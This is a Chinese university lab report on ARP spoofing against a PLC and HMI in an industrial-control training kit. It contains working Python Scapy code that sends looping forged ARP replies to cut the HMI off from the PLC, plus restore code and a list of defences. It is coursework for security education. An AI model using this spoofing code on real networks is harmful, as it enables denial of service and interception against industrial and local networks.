# 物联网安全课程实验报告

<center>实验四</center>

![image-20231108000449698](./assets/image-20231108000449698.png)

<center>实验名称：ARP欺骗攻击实验</center>

<center>小组成员：梁晓储2110951 周涛2110651</center>

<center>专业：物联网工程</center>

<center>提交日期：2023.11.21</center>

## 一、实验目的

理解ARP协议及ARP攻击基本原理，学习Python下的网络编程库Scapy的基本使用，并在实验环境中实现ARP攻击，理解保障系统安全的复杂性



## 二、相关工具及编程库简介

Scapy是一个Python库，用于网络数据包的创建、发送、捕获和分析。它可以用于网络协议开发、网络安全评估、网络故障排除等各种网络相关任务。Scapy提供了一个简单而灵活的API，可以轻松地构建和修改各种网络协议的数据包。它支持常见的协议，如IP、TCP、UDP、ICMP等，同时也支持自定义协议的创建和解析。使用Scapy，你可以发送自定义的网络数据包，例如发送ARP请求、TCP SYN扫描、ICMP ping等。你还可以捕获网络流量，分析数据包的内容和结构，以及进行网络流量分析和嗅探。它还提供了一些实用工具，如网络扫描、端口扫描、流量生成等。它还支持与其他网络工具和库的集成，如Wireshark、Nmap等。Scapy是一个功能强大且灵活的网络工具，从网络协议开发到网络安全评估，可以帮助你进行各种网络相关任务。

本实验中调用的scapy库函数：

- sr1函数：发送ARP请求包，得到所给IP地址回传的ARP包内容。

- Show函数：输出获取的ARP的内容。

- ARP函数：构造自定义的ARP包内容。

- Send函数：发送我们自己构造的ARP包。



## 三、实验要求及要点

1. 使用Python Scapy对工控试验箱PLC进行ARP攻击实验，达到拒绝服务攻击效果。

> - 发送ARP请求包确认并记录PLC和HMI的MAC地址与IP地址，以备后面恢复（十分重要：攻击后需要将IP与MAC地址改成与正确缓存一致）。注：192.168.1.4是HMI上位机地址，192.168.1.3是PLC。
>
> - 利用ARP欺骗攻击，使得HMI无法控制PLC，达到拒绝服务攻击效果
>
> - 比较与实验二中拒绝服务攻击效果的差异
>
> - 复原现场。（发包将IP和MAC地址对应关系改回去，使PLC能正常工作）

2. （可选）使用Python Scapy对实验三设计的智能家居系统尝试进行ARP攻击，达到拒绝服务攻击效果。

3. （可选）基于双向ARP欺骗实现中间人攻击，分析上位机与PLC通信流量，并对上位机开展数据欺骗攻击，达到HMI显示与实际硬件显示不一致的效果。



## 四、实验内容

### 发送ARP包确认PLC和HMI的MAC地址和IP地址

```python
from scapy.all import *

plc = sr1(ARP(pdst="192.168.1.3"))
print("PLC:")
plc.show()

hmi = sr1(ARP(pdst="192.168.1.4"))
print("HMI:")
hmi.show()
```

得到的结果为

```bash
PLC:
###[ ARP ]### 
  hwtype    = Ethernet (10Mb)
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = is-at
  hwsrc     = e0:dc:a0:36:bf:fd
  psrc      = 192.168.1.3
  hwdst     = 08:26:ae:3e:f3:b0
  pdst      = 192.168.1.99
###[ Padding ]### 
     load      = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
     
     
 HMI:
 ###[ ARP ]### 
  hwtype    = Ethernet (10Mb)
  ptype     = IPv4
  hwlen     = 6
  plen      = 4
  op        = is-at
  hwsrc     = e0:dc:a0:30:2f:3f
  psrc      = 192.168.1.4
  hwdst     = 08:26:ae:3e:f3:b0
  pdst      = 192.168.1.99
###[ Padding ]### 
     load      = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

  由此就得到了PLC和HMI的MAC地址分别为`e0:dc:a0:36:bf:fd`和`e0:dc:a0:30:2f:3f`



### ARP欺骗攻击

```python
atk = ARP(psrc="192.168.1.3", hwsrc="ee:ee:ee:ee:ee:ee", hwdst="e0:dc:a0:30:2f:3f", pdst="192.168.1.4", op='is-at')
send(atk, inter=RandNum(10,20), loop=1)
```

首先创建一个叫做`atk`的ARP数据包对象，指定源IP地址为PLC的IP地址，目标MAC和目标IP地址为HMI的，并且拟造一个假的源MAC

然后用Scapy的send函数不断发送ARP欺骗攻击数据包，并且在每个数据包之间随即设置时间间隔，以增加攻击的随机性



当实验箱接收到了我们发送的ARP欺骗包后，HMI便无法控制PLC，一些显示信息也无法正常显示

![img_v3_0257_7f38675c-4eef-430d-b83f-fc1d32bcfd3g](./assets/img_v3_0257_7f38675c-4eef-430d-b83f-fc1d32bcfd3g.jpg)



### 复原现场

复原现场有两种方式

1. 我们自己发送ARP包帮助HMI恢复与PLC的连接

首先中断atk包的发送，然后发送resume包

```python
resume = ARP(psrc="192.168.1.3", hwsrc="e0:dc:a0:36:bf:fd", hwdst="e0:dc:a0:30:2f:3f", pdst="192.168.1.4", op='is-at')
send(resume, inter=RandNum(1,10), loop=1)
```

当HMI接收到这个ARP包后就可以恢复对于PLC的控制

![img_v3_0257_ac303c74-7b76-4af1-adcc-642d6f640b4g](./assets/img_v3_0257_ac303c74-7b76-4af1-adcc-642d6f640b4g.jpg)



2. 等待试验箱自己发送ARP广播恢复连接

根据我们实验时的观察可知，在停止ARP攻击后即使不发送resume包，HMI对于PLC的控制也会在一段时间内恢复

经过我们分析，可能是试验箱有着自我恢复机制，即会自动广播ARP包，帮助HMI和PLC之间进行连接



## 五、回答问题

### 1. 为什么攻击后需要复原现场？

> 攻击后复原现场让系统能恢复正常的通信，还原我们对实验箱的攻击造成的破坏，保护实验箱是我们做实验时的责任。



### 2. 本实验的攻击效果与实验二中指令攻击的攻击效果有何异同？为什么？

>本实验采用的攻击是ARP欺骗攻击，实验二采用的攻击是指令攻击
>
>
>
>相同点：
>
>1. 都是网络安全领域的常见攻击手段，用于对计算机系统或网络进行攻击。
>2. 都是恶意攻击行为，旨在获取未授权的信息、破坏系统或者干扰网络通信。
>3. 都需要攻击者具备一定的技术能力和对目标系统或网络的深入了解。
>
>在本实验和实验二中，两者的攻击方式都是通过伪造并修改数据包，并将其送入HMI和PLC的环境来干扰两者之间的正常通讯。
>
>
>
>不同点：
>
>1. 攻击对象不同：ARP欺骗攻击主要针对局域网中的通信，通过欺骗目标主机的ARP表实现攻击；而指令攻击则是针对系统或应用程序的漏洞，通过发送恶意指令或利用已知的指令注入漏洞来攻击目标。
>2. 攻击手段不同：ARP欺骗攻击是一种中间人攻击，攻击者通过伪造ARP响应来欺骗其他设备；指令攻击则是通过操纵或篡改系统或应用程序的指令来达到攻击目的。
>3. 影响范围不同：ARP欺骗攻击通常限于局域网内，攻击者需要在同一网络中才能进行攻击；而指令攻击可以通过网络远程执行，攻击者可以从远程位置发起攻击。
>
>在实验二中，指令攻击是以假冒HMI的身份发出改变PLC控制指令的方式，使得整个系统出现异常的行为，并且攻击之后实验箱内的PLC状态会出现异常并且无法正常运行；而本实验中，ARP欺骗攻击则是通过扰乱网络通讯，使得HMI无法与PLC进行正常的通讯，以此实现拒绝服务的效果。但是在使用ARP欺骗攻击的时候，只会使得HMI和PLC之间失去连接，但是PLC依然会维持原本的状态持续运行。



### 3. 本实验中的ARP欺骗攻击对实验三中受到加密保护的系统是否有效？为什么？

> 仍然有效。
>
> 因为ARP欺骗攻击的原理是让IP和MAC无法建立正确映射关系，而实验三中的加密保护是对发送的数据包内容进行加密，使攻击者无法解析数据包的内容。



### 4. 简要探讨ARP攻击防范措施

>针对ARP攻击，有一些常见的防范措施可以采取：
>
>1. 静态ARP表设置：管理员可以手动配置静态ARP表，将IP地址与MAC地址进行绑定，这样可以有效防止ARP欺骗攻击。
>2. ARP监控和检测：通过使用网络流量监控工具或专门的ARP监控工具，对网络中的ARP请求和响应进行监测和检测，及时发现异常ARP流量并采取相应的应对措施。
>3. ARP防火墙：部署专门的ARP防火墙设备或在网络设备上启用ARP防火墙功能，对于不符合规则的ARP流量进行过滤和阻止。
>4. 网络入侵检测系统（IDS）和入侵防御系统（IPS）：部署IDS和IPS设备，能够对网络中的恶意ARP行为进行监测和防御，及时发现并阻止ARP攻击。
>5. 加密通信：在局域网中使用加密通信协议，如HTTPS、SSH等，可以降低ARP攻击的威胁。
>6. 网络安全意识培训：对网络管理员和用户进行网络安全意识培训，提高对ARP攻击的认识和防范意识，避免成为ARP攻击的受害者。




## 六、收获感悟

通过本次实验，我们了解学习了scapy包的使用，并且更加深入地了解和熟悉ARP欺骗攻击的手法和原理，以及它对工业控制系统可能造成的危害。同时这也提醒我们要重视网络安全防护工作，在以后的学习中加深对该类威胁的了解与解决。
